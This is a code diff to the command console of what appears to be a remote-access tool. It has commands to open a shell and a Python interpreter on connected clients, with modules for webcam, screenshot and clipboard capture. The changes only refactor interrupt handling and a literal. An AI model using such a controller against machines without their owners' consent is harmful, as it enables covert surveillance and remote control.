@@ -9,7 +9,7 @@ from contextlib import suppress
 from modules import (clipboard, download, filetransfer, screenshot,
                      shells, tasks, webcam, windows, network)
 from modules.baseserver import Server
-from utils import terminal, ignore
+from utils import terminal
 from utils.timeout_handler import timeoutsetter
 
 # Enables using arrowkeys on unix-like systems
@@ -125,6 +125,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(f'Ping: {latency}ms')
 
     @terminal.require_client
+    @terminal.ignore(KeyboardInterrupt)
     def do_shell(self, _) -> None:
         """ Open a shell to client """
         # Fetch current working directory
@@ -169,14 +170,14 @@ class ServerCLI(Server, cmd.Cmd):
                     print(self.client.read().decode(), end="")
 
     @terminal.require_client
-    @ignore.keyboardinterrupt
+    @terminal.ignore(KeyboardInterrupt)
     def do_python(self, _) -> None:
         """ Open a python interpreter to client """
         logging.debug('Launched python interpreter (%s)', self.client.port)
         while True:
             command = input('>>> ')
 
-            if command.strip().lower() in ['exit', 'exit()']:
+            if command.strip().lower() in ('exit', 'exit()'):
                 break
 
             print(shells.python(self.client, command), end='')
